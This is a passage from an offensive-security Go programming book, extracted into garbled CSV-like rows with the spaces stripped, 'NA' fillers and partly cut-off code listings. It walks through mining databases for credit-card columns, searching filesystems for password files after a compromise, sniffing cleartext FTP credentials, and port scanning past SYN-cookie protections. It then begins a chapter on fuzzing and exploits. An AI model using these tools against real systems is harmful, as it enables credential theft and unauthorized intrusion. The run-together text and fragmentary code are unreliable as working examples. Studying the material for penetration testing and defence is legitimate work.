ofJSON/BSONwithattributetagstomarshalandunmarshal ,NA,NA
dataintocomplexstructures;youmaintainvariablestotrack ,NA,NA
theinformationinyourcurrentrowandcompareitwiththe ,NA,NA
"datafromthepreviousrow,inordertodeterminewhether ",NA,NA
you’veencounteredanewdatabaseortable.Notthemost ,NA,NA
"elegantsolution,butitgetsthejobdone.",NA,NA
"Next,youcheckwhetherthedatabasenameforyour ",NA,NA
"currentrowdiffersfromyourpreviousrow❹.Ifso,you ",NA,NA
createanew,miner.Database,NA
instance.Ifitisn’tyourfirstiteration,NA,NA
"oftheloop,addthetableanddatabasetoyour",miner.Schema,NA
instance.Youusesimilarlogictotrackandadd,miner.Table,NA
instancestoyourcurrent,miner.Database,NA
"❺.Lastly,addeachof ",NA,NA
thecolumnstoour,miner.Table,NA
❻.,NA,NA
"Now,runtheprogramagainstyourDockerMySQL",NA,NA
"instancetoconfirmthatitworksproperly,asshownhere:","$
 gorunmain.go127.0.0.1
  
  
 [DB]=store
  
  
 [TABLE]=transactions
  
  
 [COL]=ccnum
  
  
 [COL]=date
  
  
 [COL]=amount
  
  
 [COL]=cvv
  
  
 [COL]=exp
  
  
 [+]HIT:ccnum",NA
Theoutputshouldbealmostindiscerniblefromyour,NA,NA
MongoDBoutput.Thisisbecauseyour,dbminer.Schema,NA
isn’t,NA,NA
producinganyoutput—the,dbminer.Search(),NA
functionis.Thisis,NA,NA
thepowerofusinginterfaces.Youcanhavespecific,NA,NA
"implementationsofkeyfeatures,yetstillutilizeasingle,",NA,NA
"standardfunctiontoprocessyourdatainapredictable,usable",NA,NA
manner.,NA,NA
"Inthenextsection,you’llstepawayfromdatabasesand",NA,NA
insteadfocusonpillagingfilesystems.,NA,NA
PILLAGINGAFILESYSTEM,NA,NA
"Inthissection,you’llbuildautilitythatwalksauser-supplied",NA,NA
"filesystempathrecursively,matchingagainstalistof ",NA,NA
interestingfilenamesthatyouwoulddeemusefulaspartofa ,NA,NA
"post-exploitationexercise.Thesefilesmaycontain,among ",NA,NA
"otherthings,personallyidentifiableinformation,usernames",NA,NA
", passwords,systemlogins,andpassworddatabasefiles.",NA,NA
Theutilitylooksspecificallyatfilenamesratherthanfile ,NA,NA
"contents,andthescriptismademuchsimplerbythefactthat ",NA,NA
Gocontainsstandardfunctionalityinits,path/filepath,NA
package,NA,NA
thatyoucanusetoeasilywalkadirectorystructure.Youcan ,NA,NA
seetheutilityin,NA,NA
Listing7-11,NA,NA
.,"packagemain
  
 import( 
  
 ""fmt"" 
  
 ""log"" 
  
 ""os"" 
  
 ""path/filepath"" 
  
 ""regexp"" 
  
 )
  
 ❶varregexes=[]*regexp.Regexp{ 
  
 regexp.MustCompile(`(?i)user`),
  
 regexp.MustCompile(`(?i)password`), 
  
 regexp.MustCompile(`(?i)kdb`), 
  
 regexp.MustCompile(`(?i)login`), 
  
 }
  
 ❷funcwalkFn(pathstring,fos.FileInfo,errerror)error{ 
 for_,r:=rangeregexes{
  
  
 ❸ifr.MatchString(path){ 
  
 fmt.Printf(""[+]HIT:%s\n"",path)
  
 } 
  
 } 
  
 returnnil
  
 }",NA
"Incontrasttoyourdatabase-miningimplementations,the",NA,NA
filesystempillagingsetupandlogicmightseemalittletoo,NA,NA
simple.Similartothewayyoucreatedyourdatabase,NA,NA
"implementations,youdefinearegexlistforidentifying ",NA,NA
"interestingfilenames❶.Tokeepthecodeminimal,we ",NA,NA
"limitedthelisttojustahandfulofitems,butyoucanexpand",NA,NA
thelisttoaccommodatemorepracticalusage.,NA,NA
"Next,youdefineafunction,named",walkFn(),NA
",thatacceptsa ",NA,NA
filepathandsomeadditionalparameters❷.Thefunction ,NA,NA
loopsoveryourregularexpressionlistandchecksformatches,NA,NA
"❸,displayingthemtostdout.The",walkFn(),NA
function❹isused ,NA,NA
inthe,main(),NA
"function,andpassedasaparameterto",filepath.Walk(),NA
.,NA,NA
The,Walk(),NA
functionexpectstwoparameters—arootpathanda,NA,NA
"function(inthiscase,",walkFn(),NA
)—andrecursivelywalksthe,NA,NA
directorystructurestartingatthevaluesuppliedastheroot,NA,NA
"path,calling",walkFn(),NA
foreverydirectoryandfileitencounters.,NA,NA
"Withyourutilitycomplete,navigatetoyourdesktopand",NA,NA
createthefollowingdirectorystructure:,"$
 treetargetpath/
  
  
 targetpath/
  
  
 ---anotherpath
  
  
 ----nothing.txt
  
  
 ----users.csv",NA
Runningyourutilityagainstthissame,targetpath,NA
directory,NA,NA
"producesthefollowingoutput,confirmingthatyourcode ",NA,NA
workssplendidly:,"$
 gorunmain.go./somepath
  
  
 [+]HIT:somepath/anotherpath/users.csv
  
  
 [+]HIT:somepath/yetanotherpath/passwords.xlsx",NA
That’sjustaboutallthereistoit.Youcanimprovethe ,NA,NA
samplecodethroughtheinclusionofadditionalormore-,NA,NA
"specificregularexpressions.Further,weencourageyouto ",NA,NA
improvethecodebyapplyingtheregularexpressioncheck ,NA,NA
"onlytofilenames,notdirectories.Anotherenhancementwe ",NA,NA
encourageyoutomakeistolocateandflagspecificfileswith ,NA,NA
arecentmodifiedoraccesstime.Thismetadatacanleadyou ,NA,NA
"tomoreimportantcontent,includingfilesusedaspartof ",NA,NA
criticalbusinessprocesses.,NA,NA
SUMMARY,NA,NA
"Inthischapter,wedoveintodatabaseinteractionsand ",NA,NA
"filesystemwalking,usingbothGo’snativepackagesandthird-",NA,NA
partylibrariestoinspectdatabasemetadataandfilenames.For ,NA,NA
"anattacker,theseresourcesoftencontainvaluable ",NA,NA
"information,andwecreatedvariousutilitiesthatallowusto ",NA,NA
searchforthisjuicyinformation.,NA,NA
"Inthenextchapter,you’lltakealookatpracticalpacket ",NA,NA
"processing.Specifically,you’lllearnhowtosniffand ",NA,NA
manipulatenetworkpackets.,NA,NA
8 ,NA,NA
RAWPACKETPROCESSING,NA,NA
"Inthischapter,you’lllearnhowtocaptureandprocess ",NA,NA
networkpackets.Youcanusepacketprocessingformany ,NA,NA
"purposes,includingtocapturecleartextauthentication ",NA,NA
"credentials,altertheapplicationfunctionalityofthepackets",NA,NA
", orspoofandpoisontraffic.YoucanalsouseitforSYN ",NA,NA
scanningandforportscanningthroughSYN-flood ,NA,NA
"protections,amongotherthings.",NA,NA
We’llintroduceyoutotheexcellent,gopacket,NA
packagefrom,NA,NA
"Google,whichwillenableyoutobothdecodepacketsand ",NA,NA
reassemblethestreamoftraffic.Thispackageallowsyouto ,NA,NA
"filtertrafficbyusingtheBerkeleyPacketFilter(BPF),also ",NA,NA
calledtcpdumpsyntax;readandwrite,NA,NA
.pcap,NA,NA
files;inspect ,NA,NA
variouslayersanddata;andmanipulatepackets.,NA,NA
We’llwalkthroughseveralexamplestoshowyouhowto ,NA,NA
"identifydevices,filterresults,andcreateaportscannerthat ",NA,NA
canbypassSYN-floodprotections.,NA,NA
SETTINGUPYOURENVIRONMENT,NA,NA
"Beforeworkingthroughthecodeinthischapter,youneedto ",NA,NA
"setupyourenvironment.First,install",gopacket,NA
byenteringthe,NA,NA
following:,"$
 gogetgithub.com/google/gopacket",NA
"Now,",gopacket,NA
reliesonexternallibrariesanddriversto,NA,NA
bypasstheoperatingsystem’sprotocolstack.Ifyouintendto ,NA,NA
compiletheexamplesinthischapterforuseonLinuxor ,NA,NA
"macOS,you’llneedtoinstall",libpcap-dev,NA
.Youcandothiswith,NA,NA
mostpackagemanagementutilitiessuchas,apt,NA
",",yum,NA
",or",brew,NA
.,NA,NA
Here’showyouinstallitbyusing,apt,NA
(theinstallationprocess,NA,NA
lookssimilarfortheothertwooptions):,"$
 sudoapt-getinstalllibpcap-dev",NA
Ifyouintendtocompileandruntheexamplesinthis ,NA,NA
"chapteronWindows,youhaveacoupleofoptions,basedon ",NA,NA
whetheryou’regoingtocross-compileornot.Settingupa ,NA,NA
developmentenvironmentissimplerifyoudon’tcross-,NA,NA
"compile,butinthatcase,you’llhavetocreateaGo ",NA,NA
"developmentenvironmentonaWindowsmachine,whichca",NA,NA
n beunattractiveifyoudon’twanttoclutteranother ,NA,NA
"environment.Forthetimebeing,we’llassumeyouhavea ",NA,NA
workingenvironmentthatyoucanusetocompileWindows ,NA,NA
"binaries.Withinthisenvironment,you’llneedtoinstall ",NA,NA
WinPcap.Youcandownloadaninstallerforfreefrom ,NA,NA
https://www.winpcap.org,NA,NA
/,NA,NA
.,NA,NA
IDENTIFYINGDEVICESBYUSING ,NA,NA
THEPCAPSUBPACKAGE,NA,NA
"Beforeyoucancapturenetworktraffic,youmustidentify",NA,NA
availabledevicesonwhichyoucanlisten.Youcandothis,NA,NA
easilyusingthe,gopacket/pcap,NA
"subpackage,whichretrievesthem",NA,NA
withthefollowinghelperfunction:,"pcap.FindAllDevs()(ifs[]Interface,
  
 errerror)",NA
.,NA,NA
Listing8-1,NA,NA
showshowyoucanuseittolistall,NA,NA
availableinterfaces.(Allthecodelistingsattherootlocation,NA,NA
of/existundertheprovidedgithubrepo,NA,NA
https://github.com/blackhat-go/bhg/,NA,NA
.),"packagemain
  
  
 import(
  
 ""fmt""
  
 ""log""
  
  
 ""github.com/google/gopacket/pcap""
  
  
 )
  
  
 funcmain(){
  
 ❶devices,err:=pcap.FindAllDevs() 
 iferr!=nil{
  
 log.Panicln(err)
  
 }
  
 ❷for_,device:=rangedevices{ 
  
 fmt.Println(device.Name❸)
  
   
 ❹for_,address:=rangedevice.Addresses{
  
   
 ❺fmt.Printf(""IP:%s\n"",address.IP)
  
 fmt.Printf(""Netmask:%s\n"",address.Netmask)
  
 }
  
 }
  
 }
  
 Listing8-1:Listingtheavailablenetworkdevices(
 /ch-8/identify/main.go
 )",NA
Youenumerateyourdevicesbycalling,pcap.FindAllDevs(),NA
❶. ,NA,NA
"Thenyouloopthroughthedevicesfound❷.Foreachdevice, ",NA,NA
"youaccessvariousproperties,includingthe",device.Name,NA
❸.You,NA,NA
alsoaccesstheirIPaddressesthroughthe,Addresses,NA
"property,",NA,NA
whichisasliceoftype,pcap.InterfaceAddress,NA
.Youloopthrough ,NA,NA
"theseaddresses❹,displayingtheIPaddressandnetmaskt",NA,NA
o thescreen❺.,NA,NA
Executingyourutilityproducesoutputsimilarto,NA,NA
Listing8-,NA,NA
2,NA,NA
.,"$
 gorunmain.go
  
  
 enp0s5
  
  
 IP:10.0.1.20
  
  
 Netmask:ffffff00
  
  
 IP:fe80::553a:14e7:92d2:114b
  
  
 Netmask:ffffffffffffffff0000000000000000
  
  
 any
  
  
 lo
  
  
 IP:127.0.0.1
  
  
 Netmask:ff000000
  
  
 IP:::1
  
  
 Netmask:ffffffffffffffffffffffffffffffff
  
 Listing8-2:Outputshowingtheavailablenetworkinterfaces",NA
Theoutputliststheavailablenetworkinterfaces—,enp0s5,NA
",",any,NA
",and",lo,NA
—aswellastheirIPv4andIPv6addressesand,NA,NA
netmasks.Theoutputonyoursystemwilllikelydifferfrom,NA,NA
"thesenetworkdetails,butitshouldbesimilarenoughthatyou",NA,NA
canmakesenseoftheinformation.,NA,NA
LIVECAPTURINGANDFILTERING,NA,NA
RESULTS,NA,NA
"Nowthatyouknowhowtoqueryavailabledevices,youcan",NA,NA
use,gopacket,NA
’sfeaturestocapturelivepacketsoffthewire.In,NA,NA
"doingso,you’llalsofilterthesetofpacketsbyusingBPF",NA,NA
syntax.BPFallowsyoutolimitthecontentsofwhatyou,NA,NA
captureanddisplaysothatyouseeonlyrelevanttraffic.It’s ,NA,NA
commonlyusedtofiltertrafficbyprotocolandport.For ,NA,NA
"example,youcouldcreateafiltertoseeallTCPtraffic ",NA,NA
destinedforport80.Youcanalsofiltertrafficbydestination ,NA,NA
host.AfulldiscussionofBPFsyntaxisbeyondthescopeof,NA,NA
"thisbook.ForadditionalwaystouseBPF,takeapeekat ",NA,NA
http://www.tcpdump.org/manpages/pcap-,NA,NA
filter.7.html,NA,NA
.,NA,NA
Listing8-3,NA,NA
"showsthecode,whichfilterstrafficsothatyou ",NA,NA
captureonlyTCPtrafficsenttoorfromport80.,"packagemain
  
 import( 
  
 ""fmt"" 
  
 ""log""
  
 ""github.com/google/gopacket"" 
  
 ""github.com/google/gopacket/pcap"" 
  
 )
  
 ❶var( 
  
 iface=""enp0s5""
  
 snaplen=int32(1600) 
  
 promisc=false 
  
 timeout=pcap.BlockForever 
  
 filter=""tcpandport80"" 
  
 devFound=false 
  
 )
  
 funcmain(){ 
  
 devices,err:=pcap.FindAllDevs()❷iferr!
 =nil{
  
 log.Panicln(err) 
  
 }
  
 ❸for_,device:=rangedevices{",NA
Thecodestartsbydefiningseveralvariablesnecessaryto ,NA,NA
setupthepacketcapture❶.Includedamongtheseisthename ,NA,NA
"oftheinterfaceonwhichyouwanttocapturedata,the ",NA,NA
"snapshotlength(theamountofdatatocaptureforeachframe), ",NA,NA
the,promisc,NA
variable(whichdetermineswhetheryou’llbe,NA,NA
"runningpromiscuousmode),andyourtime-out.Also,you ",NA,NA
defineyourBPFfilter:,tcpandport80,NA
.Thiswillmakesureyou,NA,NA
captureonlypacketsthatmatchthosecriteria.,NA,NA
Withinyour,main(),NA
"function,youenumeratetheavailable ",NA,NA
"devices❷,loopingthroughthemtodeterminewhetheryou",NA,NA
r,NA,NA
desiredcaptureinterfaceexistsinyourdevicelist❸.Ifthe ,NA,NA
"interfacenamedoesn’texist,thenyoupanic,statingthatit’s ",NA,NA
invalid.,NA,NA
Whatremainsintherestofthe,main(),NA
functionisyour,NA,NA
"capturinglogic.Fromahigh-levelperspective,youneedto ",NA,NA
firstobtainorcreatea,*pcap.Handle,NA
",whichallowsyoutoread",NA,NA
"andinjectpackets.Usingthishandle,youcanthenapplya ",NA,NA
"BPFfilterandcreateanewpacketdatasource,fromwhich ",NA,NA
youcanreadyourpackets.,NA,NA
Youcreateyour,*pcap.Handle,NA
(named,handle,NA
inthecode)by ,NA,NA
issuingacallto,pcap.OpenLive(),NA
❹.Thisfunctionreceivesan ,NA,NA
"interfacename,asnapshotlength,abooleanvaluedefining ",NA,NA
"whetherit’spromiscuous,andatime-outvalue.Theseinput ",NA,NA
variablesarealldefinedpriortothe,main(),NA
"function,aswe",NA,NA
detailedpreviously.Call,handle.SetBPFFilter(filter),NA
tosettheBPF ,NA,NA
"filterforyourhandle❺,andthenuse",handle,NA
asaninputwhile ,NA,NA
calling,"gopacket.NewPacketSource(handle,handle.LinkType())",NA
tocreatea ,NA,NA
"newpacketdatasource❻.Thesecondinputvalue, ",handle.LinkType(),NA
",definesthedecodertousewhenhandling",NA,NA
"packets.Lastly,youactuallyreadpacketsfromthewireby ",NA,NA
usingaloopon,source.Packets(),NA
"❼,whichreturnsachannel.",NA,NA
"Asyoumightrecallfrompreviousexamplesinthisbook, ",NA,NA
loopingonachannelcausesthelooptoblockwhenithasno ,NA,NA
"datatoreadfromthechannel.Whenapacketarrives,youread ",NA,NA
itandprintitscontentstoscreen.,NA,NA
Theoutputshouldlooklike,NA,NA
Listing8-4,NA,NA
.Notethatthe ,NA,NA
programrequireselevatedprivilegesbecausewe’rereadin,NA,NA
g rawcontentoffthenetwork.,"$
 gobuild-ofilter&&sudo./filter",NA
"Althoughtherawoutputisn’tverydigestible,itcertainly ",NA,NA
containsaniceseparationofeachlayer.Youcannowuse ,NA,NA
"utilityfunctions,suchas",packet.ApplicationLayer(),NA
and,packet.Data(),NA
",to",NA,NA
retrievetherawbytesforasinglelayerortheentirepacket. ,NA,NA
Whenyoucombinetheoutputwith,hex.Dump(),NA
",youcandisplay",NA,NA
thecontentsinamuchmorereadableformat.Playaroundwith ,NA,NA
thisonyourown.,NA,NA
SNIFFINGANDDISPLAYING ,NA,NA
CLEARTEXTUSERCREDENTIALS,NA,NA
Nowlet’sbuildonthecodeyoujustcreated.You’llreplicate ,NA,NA
someofthefunctionalityprovidedbyothertoolstosniffand ,NA,NA
displaycleartextusercredentials.,NA,NA
Mostorganizationsnowoperatebyusingswitched ,NA,NA
"networks,whichsenddatadirectlybetweentwoendpoints ",NA,NA
"ratherthanasabroadcast,makingithardertopassively ",NA,NA
"capturetrafficinanenterpriseenvironment.However,the ",NA,NA
followingcleartextsniffingattackcanbeusefulwhenpaired ,NA,NA
withsomethinglikeAddressResolutionProtocol(ARP) ,NA,NA
"poisoning,anattackthatcancoerceendpointsinto ",NA,NA
communicatingwithamaliciousdeviceonaswitched ,NA,NA
"network,orwhenyou’recovertlysniffingoutboundtraffic ",NA,NA
"fromacompromiseduserworkstation.Inthisexample,we’ll ",NA,NA
assumeyou’vecompromisedauserworkstationandfocus ,NA,NA
solelyoncapturingtrafficthatusesFTPtokeepthecodebrief.,NA,NA
"Withtheexceptionofafewsmallchanges,thecodein ",NA,NA
Listing8-5,NA,NA
isnearlyidenticaltothecodein,NA,NA
Listing8-3,NA,NA
.,"packagemain
  
  
 import(
  
  
 ""bytes""
  
  
 ""fmt""",NA
Thechangesyoumadeencompassonlyabout10linesof ,NA,NA
"code.First,youchangeyourBPFfiltertocaptureonlytraffic ",NA,NA
destinedforport21(theportcommonlyusedforFTPtraffic),NA,NA
❶.Therestofthecoderemainsthesameuntilyouprocessthe ,NA,NA
packets.,NA,NA
"Toprocesspackets,youfirstextracttheapplicationlayer ",NA,NA
"fromthepacketandchecktoseewhetheritactuallyexists❷, ",NA,NA
becausetheapplicationlayercontainstheFTPcommandsand ,NA,NA
data.Youlookfortheapplicationlayerbyexaminingwhether ,NA,NA
theresponsevaluefrom,packet.ApplicationLayer(),NA
is,nil,NA
.Assuming,NA,NA
"theapplicationlayerexistsinthepacket,youextractthe ",NA,NA
payload(theFTPcommands/data)fromthelayerbycalling ,appLayer.Payload(),NA
❸.(Therearesimilarmethodsforextracting ,NA,NA
"andinspectingotherlayersanddata,butyouonlyneedthe ",NA,NA
"applicationlayerpayload.)Withyourpayloadextracted,you ",NA,NA
thencheckwhetherthepayloadcontainseitherthe,USER,NA
or ,PASS,NA
"commands❹,indicatingthatit’spartofalogin ",NA,NA
"sequence.Ifitdoes,displaythepayloadtothescreen.",NA,NA
Here’sasamplerunthatcapturesanFTPloginattempt:,"$
 gobuild-oftp&&sudo./ftp
  
  
 USERsomeuser
  
  
 PASSpassw0rd",NA
"Ofcourse,youcanimprovethiscode.Inthisexample,the ",NA,NA
payloadwillbedisplayedifthewords,USER,NA
or,PASS,NA
exist,NA,NA
"anywhereinthepayload.Really,thecodeshouldbesearching ",NA,NA
onlythebeginningofthepayloadtoeliminatefalse-positives ,NA,NA
thatoccurwhenthosekeywordsappearaspartoffilecontents ,NA,NA
transferredbetweenclientandserveroraspartofalonger ,NA,NA
wordsuchas,PASSAGE,NA
or,ABUSER,NA
.Weencourageyoutomake,NA,NA
theseimprovementsasalearningexercise.,NA,NA
PORTSCANNINGTHROUGHSYN-,NA,NA
FLOODPROTECTIONS,NA,NA
In,NA,NA
Chapter2,NA,NA
",youwalkedthroughthecreationofaport ",NA,NA
scanner.Youimprovedthecodethroughmultipleiterations ,NA,NA
untilyouhadahigh-,NA,NA
performingimplementationthatproduced ,NA,NA
"accurateresults.However,insomeinstances,thatscannercan ",NA,NA
"stillproduceincorrectresults.Specifically,whenan ",NA,NA
"organizationemploysSYN-floodprotections,typicallyall ",NA,NA
"ports—open,closed,andfilteredalike—producethesame ",NA,NA
packetexchangetoindicatethattheportisopen.These ,NA,NA
"protections,knownasSYN",NA,NA
cookies,NA,NA
",preventSYN-flood ",NA,NA
"attacksandobfuscatetheattacksurface,producingfalse-",NA,NA
positives.,NA,NA
"WhenatargetisusingSYNcookies,howcanyou ",NA,NA
determinewhetheraserviceislisteningonaportoradeviceis,NA,NA
"falselyshowingthattheportisopen?Afterall,inbothcases, ",NA,NA
theTCPthree-wayhandshakeiscompleted.Mosttoolsand ,NA,NA
scanners(Nmapincluded)lookatthissequence(orsome ,NA,NA
"variationofit,basedonthescantypeyou’vechosen)to ",NA,NA
"determinethestatusoftheport.Therefore,youcan’trelyon ",NA,NA
thesetoolstoproduceaccurateresults.,NA,NA
"However,ifyouconsiderwhathappensafteryou’ve ",NA,NA
"establishedaconnection—anexchangeofdata,perhapsinthe ",NA,NA
formofaservicebanner—youcandeducewhetheranactual ,NA,NA
serviceisresponding.SYN-floodprotectionsgenerallywon’t ,NA,NA
exchangepacketsbeyondtheinitialthree-wayhandshake ,NA,NA
"unlessaserviceislistening,sothepresenceofanyadditional ",NA,NA
packetsmightindicatethataserviceexists.,NA,NA
CheckingTCPFlags,NA,NA
"ToaccountforSYNcookies,youhavetoextendyourport-",NA,NA
scanningcapabilitiestolookbeyondthethree-wayhandshake ,NA,NA
bycheckingtoseewhetheryoureceiveanyadditionalpackets ,NA,NA
fromthetargetafteryou’veestablishedaconnection.Youcan ,NA,NA
accomplishthisbysniffingthepacketstoseeifanyofthem ,NA,NA
weretransmittedwithaTCPflagvalueindicativeof ,NA,NA
"additional,legitimateservicecommunications.",NA,NA
TCPflags,NA,NA
indicateinformationaboutthestateofapacket ,NA,NA
"transfer.IfyoulookattheTCPspecification,you’llfindthat ",NA,NA
theflagsarestoredinasinglebyteatposition14inthe ,NA,NA
packet’sheader.Eachbitofthisbyterepresentsasingleflag ,NA,NA
"value.Theflagis“on”ifthebitatthatpositionissetto1,and“off”if",NA,NA
thebitissetto0.,NA,NA
Table8-1,NA,NA
showsthepositionsofthe ,NA,NA
"flagsinthebyte,aspertheTCPspecification.","Table8-1:
 TCPFlagsandTheirBytePositions",NA
"Onceyouknowthepositionsoftheflagsyoucareabout, ",NA,NA
"youcancreateafilterthatchecksthem.Forexample,youcan ",NA,NA
"lookforpacketscontainingthefollowingflags,whichmight ",NA,NA
indicatealisteningservice:,"ACKandFIN
  
  
 ACK
  
  
 ACKandPSH",NA
Becauseyouhavetheabilitytocaptureandfiltercertain ,NA,NA
packetsbyusingthe,gopacket,NA
"library,youcanbuildautilitythat",NA,NA
"attemptstoconnecttoaremoteservice,sniffsthepackets,and ",NA,NA
displaysonlytheservicesthatcommunicatepacketswiththes,NA,NA
e ,NA,NA
TCPheaders.Assumeallotherservicesarefalsely“open”becau,NA,NA
seofSYNcookies.,NA,NA
BuildingtheBPFFilter,NA,NA
YourBPFfilterneedstocheckforthespecificflagvaluesthat ,NA,NA
indicatepackettransfer.Theflagbytehasthefollowingvalues ,NA,NA
iftheflagswementionedearlierareturnedon:,"ACKandFIN:00010001(0x11)
  
  
 ACK:00010000(0x10)
  
  
 ACKandPSH:00011000(0x18)",NA
Weincludedthehexequivalentofthebinaryvaluefor ,NA,NA
"clarity,asyou’llusethehexvalueinyourfilter.",NA,NA
"Tosummarize,youneedtocheckthe14thbyte(offset13 ",NA,NA
"fora0-basedindex)oftheTCPheader,filteringonlyfor",NA,NA
"packetswhoseflagsare0x11,0x10,or0x18.Here’swhatthe ",NA,NA
BPFfilterlookslike:,tcp[13]==0x11ortcp[13]==0x10ortcp[13]==0x18,NA
Excellent.Youhaveyourfilter.,NA,NA
WritingthePortScanner,NA,NA
Nowyou’llusethefiltertobuildautilitythatestablishesafull ,NA,NA
TCPconnectionandinspectspacketsbeyondthethree-way ,NA,NA
"handshaketoseewhetherotherpacketsaretransmitted, ",NA,NA
indicatingthatanactualserviceislistening.Theprogramis ,NA,NA
shownin,NA,NA
Listing8-6,NA,NA
".Forthesakeofsimplicity,we’veopted ",NA,NA
"tonotoptimizethecodeforefficiency.However,youcan ",NA,NA
greatlyimprovethiscodebymakingoptimizationssimilarto ,NA,NA
thosewemadein,NA,NA
Chapter2,NA,NA
.,"var(❶
  
 snaplen=int32(320)
  
 promisc=true 
  
 timeout=pcap.BlockForever 
  
 filter=""tcp[13]==0x11ortcp[13]==0x10ortcp[13]==0x18"" 
 devFound=false 
  
 results=make(map[string]int) 
  
 )
  
 funccapture(iface,targetstring){❷
  
 handle,err:=pcap.OpenLive(iface,snaplen,promisc,timeout)
  
 iferr!=nil{ 
  
 log.Panicln(err) 
  
 }
  
 deferhandle.Close()
  
 iferr:=handle.SetBPFFilter(filter);err!=nil{
  
 log.Panicln(err)",NA
"Broadlyspeaking,yourcodewillmaintainacountof ",NA,NA
"packets,groupedbyport,torepresenthowconfidentyouare",NA,NA
thattheportisindeedopen.You’lluseyourfiltertoselect ,NA,NA
onlypacketswiththeproperflagsset.Thegreaterthecountof ,NA,NA
"matchingpackets,thehigheryourconfidencethattheservice ",NA,NA
islisteningontheport.,NA,NA
Yourcodestartsbydefiningseveralvariablesforuse ,NA,NA
throughout❶.Thesevariablesincludeyourfilterandamap ,NA,NA
named,results,NA
thatyou’llusetotrackyourlevelofconfidence,NA,NA
thattheportisopen.You’llusetargetportsaskeysand ,NA,NA
maintainacountofmatchingpacketsasthemapvalue.,NA,NA
"Nextyoudefineafunction,",capture(),NA
",thatacceptsthe ",NA,NA
interfacenameandtargetIPforwhichyou’retesting❷.The ,NA,NA
functionitselfbootstrapsthepacketcapturemuchinthesam,NA,NA
"e wayaspreviousexamples.However,youmustusedifferent ",NA,NA
codetoprocesseachpacket.Youleveragethe,gopacket,NA
functionalitytoextractthepacket’snetworkandtransport ,NA,NA
"layers❸.Ifeitheroftheselayersisabsent,youignorethe ",NA,NA
packet;that’sbecausethenextstepistoinspectthesourceIP ,NA,NA
"andportofthepacket❹,andifthere’snotransportor ",NA,NA
"networklayer,youwon’thavethatinformation.Youthen ",NA,NA
confirmthatthepacketsourcematchestheIPaddressthat ,NA,NA
you’retargeting❺.IfthepacketsourceandIPaddressdon’t ,NA,NA
"match,youskipfurtherprocessing.Ifthepacket’ssourceIP ",NA,NA
"andportmatchyourtarget,youincrementyourconfidence ",NA,NA
levelfortheport❻.Repeatthisprocessforeachsubsequent ,NA,NA
"packet.Eachtimeyougetamatch,yourconfidencelevel ",NA,NA
increases.,NA,NA
Inyour,main(),NA
"function,useagoroutinetocallyour",capture(),NA
function❼.Usingagoroutineensuresthatyourpacket ,NA,NA
captureandprocessinglogicrunsconcurrentlywithout ,NA,NA
"blocking.Meanwhile,your",main(),NA
functionproceedstoparse,NA,NA
"yourtargetports,loopingthroughthemonebyone❽and ",NA,NA
calling,net.DialTimeout,NA
toattemptaTCPconnectionagainsteach,NA,NA
"❾.Yourgoroutineisrunning,activelywatchingthese ",NA,NA
"connectionattempts,lookingforpacketsthatindicateaservice",NA,NA
islistening.,NA,NA
"Afteryou’veattemptedtoconnecttoeachport,processall",NA,NA
ofyourresultsbydisplayingonlythoseportsthathavea,NA,NA
confidencelevelof1ormore(meaningatleastonepacket ,NA,NA
matchesyourfilterforthatport)❿.Thecodeincludesseveral ,NA,NA
callsto,time.Sleep(),NA
toensureyou’releavingadequatetimetoset,NA,NA
upthesnifferandprocesspackets.,NA,NA
"Let’slookatasamplerunoftheprogram,shownin",NA,NA
Listing,NA,NA
8-7,NA,NA
.,"$
 gobuild-osyn-flood&&sudo./syn-floodenp0s510.1.100.100
  
  
 80,443,8123,65530
  
  
 Capturingpackets
  
  
 Trying10.1.100.100:80
  
  
 Trying10.1.100.100:443
  
  
 Trying10.1.100.100:8123
  
  
 Trying10.1.100.100:65530
  
  
 Port80open(confidence:1)
  
  
 Port443open(confidence:1)
  
 Listing8-7:Port-scanningresultswithconfidenceratings",NA
Thetestsuccessfullydeterminesthatbothport80and443,NA,NA
areopen.Italsoconfirmsthatnoserviceislisteningonports,NA,NA
8123and65530.(Notethatwe’vechangedtheIPaddressin,NA,NA
theexampletoprotecttheinnocent.),NA,NA
Youcouldimprovethecodeinseveralways.Aslearning,NA,NA
"exercises,wechallengeyoutoaddthefollowing",NA,NA
enhancements:,HivaNetwork.Com,NA
SUMMARY,NA,NA
"We’vecompletedourdiscussionofpacketcaptures,focusing ",NA,NA
"primarilyonpassivesniffingactivities.Inthenextchapter, ",NA,NA
we’llfocusonexploitdevelopment.,NA,NA
9 ,NA,NA
WRITINGANDPORTINGEXPLOIT ,NA,NA
CODE,NA,NA
"Inthemajorityofthepreviouschapters,youusedGotocreate ",NA,NA
"network-basedattacks.You’veexploredrawTCP,HTTP, ",NA,NA
"DNS,SMB,databaseinteraction,andpassivepacket ",NA,NA
capturing.,NA,NA
Thischapterfocusesinsteadonidentifyingandexploiting ,NA,NA
"vulnerabilities.First,you’lllearnhowtocreateavulnerability ",NA,NA
fuzzertodiscoveranapplication’ssecurityweaknesses.Then ,NA,NA
"you’lllearnhowtoportexistingexploitstoGo.Finally,we’ll ",NA,NA
showyouhowtousepopulartoolstocreateGo-friendly ,NA,NA
"shellcode.Bytheendofthechapter,youshouldhaveabasic ",NA,NA
understandingofhowtouseGotodiscoverflawswhilealso ,NA,NA
usingittowriteanddelivervariouspayloads.,NA,NA
CREATINGAFUZZER,NA,NA
Fuzzing,NA,NA
isatechniquethatsendsextensiveamountsofdatato ,NA,NA
anapplicationinanattempttoforcetheapplicationtoproduce,NA,NA
abnormalbehavior.Thisbehaviorcanrevealcodingerrorsor ,NA,NA
"securitydeficiencies,whichyoucanlaterexploit.",NA,NA
Fuzzinganapplicationcanalsoproduceundesirableside ,NA,NA
"effects,suchasresourceexhaustion,memorycorruption,and ",NA,NA
serviceinterruption.Someofthesesideeffectsarenecessary ,NA,NA
forbughuntersandexploitdeveloperstodotheirjobsbutbad ,NA,NA
"forthestabilityoftheapplication.Therefore,it’scrucialthat ",NA,NA
youalwaysperformfuzzinginacontrolledlabenvironment. ,NA,NA
"Aswithmostofthetechniqueswediscussinthisbook,don’t ",NA,NA
fuzzapplicationsorsystemswithoutexplicitauthorization ,NA,NA
fromtheowner.,NA,NA
"Inthissection,you’llbuildtwofuzzers.Thefirstwill ",NA,NA
checkthecapacityofaninputinanattempttocrashaservice ,NA,NA
andidentifyabufferoverflow.Thesecondfuzzerwillreplay ,NA,NA
"anHTTPrequest,cyclingthroughpotentialinputvaluesto ",NA,NA
detectSQLinjection.,NA,NA
BufferOverflowFuzzing,NA,NA
Bufferoverflows,NA,NA
occurwhenausersubmitsmoredatainan ,NA,NA
